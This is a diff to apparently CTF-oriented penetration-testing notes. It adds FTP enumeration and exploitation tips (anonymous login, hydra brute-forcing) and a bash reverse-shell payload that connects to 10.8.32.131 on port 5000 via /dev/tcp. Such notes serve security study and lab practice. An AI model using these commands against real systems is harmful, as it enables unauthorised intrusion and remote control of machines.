@@ -149,9 +149,18 @@ If anonymous access is allowd, set the [username] and [password] field blank.
 
 ## FTP
 
+File Transfer Protocol is a protocol userd to remote transfer files over the network. Such as SMB uses a client-server paradigm but differently uses two different channels: a control (for commands) and a data channel (for transferring data). FTP may support either **active** or **passive** mode or both. 
+
+- In active mode, the client issues a PORT command to the server signaling the port number to which it is expecting Data Connections back.
+- In passive mode, the client issues a PASV (passive) command to indicate that it will "passively" wait for the server to supply a port number after which the client will create a Data Connection to the server. 
+
 ### Enumerating FTP
 
+Nmap is the first tool that could be used to enumerate an FTP server. In particular you must check wheter or not you are allowed to login as anonymous user by using the defaul credential `ftp` and no password. After that look for interesting files in the ftp folder. You could also upload either download data from the ftp server. Be sure to switch to active mode for easiness.
+
 ### Exploiting FTP
+
+You can use hydra to bruteforce FTP access. You should check for executables files in the ftp folder, trying to abuse them for getting a reverse shell on the target system.
 
 ## Getting a reverse shell
 
@@ -174,14 +183,17 @@ If anonymous access is allowd, set the [username] and [password] field blank.
       
 - **Metasploit**: sometimes banned from CTF environments
 
-In case not working, this is because you are in a non executable folder. Try to change folder to `/tmp` and create a bash script (also with execution permission):
+- **Bash script**: deploy a bash script on the victim machine and execute it (check folder and file permissions)
       
+      #!/bin/bash
+      bash -i >& /dev/tcp/10.8.32.131/5000 0>&1
+
+Or you can directly craft a bash script and execute it:
+
       echo "bash -c 'bash -i >& /dev/tcp/10.8.32.131/5000 0>&1'" > /tmp/shell.sh
       
-      Then:
-
-      bash /tmp/shell.sh
-
+As abitual remember setting up a listener on attacker machine.
+      
 All reverse shells are available at [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
 ## Shell Stabilization
@@ -323,11 +335,6 @@ For all other LFI-2-RCE (via /proc/self/environ, via upload, via PHPSESSID, via 
 ## Kernel Exploitation
 
 Once identified Kernel version, search for exploits for the kernel version of the target system and then run the snippet.
-
-## FTP Exploitation
-
-Check for anonymous access with "login: anonymous", then once accessed list elements in ftp folder and try to get them by means of "get filename.ext".
-If ftp is set in [passive](https://www.jscape.com/blog/bid/80512/active-v-s-passive-ftp-simplified) mode then switch to active by typing "passive".
 
 ## SUID, SUDO, Capabilities exploitation
 
